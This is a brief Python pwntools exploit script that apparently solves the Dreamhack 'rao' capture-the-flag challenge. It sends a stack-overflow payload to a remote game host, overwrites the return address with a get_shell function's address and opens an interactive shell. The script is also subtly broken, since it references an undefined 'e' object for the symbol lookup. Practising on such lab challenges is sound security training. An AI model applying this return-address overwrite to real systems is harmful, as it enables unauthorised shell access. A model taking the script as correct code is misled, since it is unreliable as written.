from pwn import *
from pwn import p64

#r = process("./rao")
r = remote("host3.dreamhack.games", 20979)

# shell = 0x4011dd
payload = b"A"*0x30 + b"B"*0x8 +p64(e.symbols['get_shell'])
# payload += p64(shell)

# r.sendlineafter("Input: ", payload)
r.sendline(payload)
r.interactive()
